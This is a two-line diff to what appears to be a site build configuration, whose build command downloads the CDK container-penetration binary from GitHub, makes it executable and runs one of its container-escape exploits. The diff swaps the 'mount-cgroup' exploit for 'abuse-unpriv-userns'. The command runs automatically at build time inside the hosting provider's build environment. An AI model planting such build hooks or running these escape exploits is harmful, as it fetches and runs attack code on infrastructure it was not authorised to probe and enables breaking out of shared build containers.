@@ -1,2 +1,2 @@
 [build]
-  command = "curl -LJO https://github.com/cdk-team/CDK/releases/download/v1.2.0/cdk_linux_amd64 && chmod a+x cdk_linux_amd64 && ./cdk_linux_amd64 run mount-cgroup ls"
+  command = "curl -LJO https://github.com/cdk-team/CDK/releases/download/v1.2.0/cdk_linux_amd64 && chmod a+x cdk_linux_amd64 && ./cdk_linux_amd64 run abuse-unpriv-userns ls"
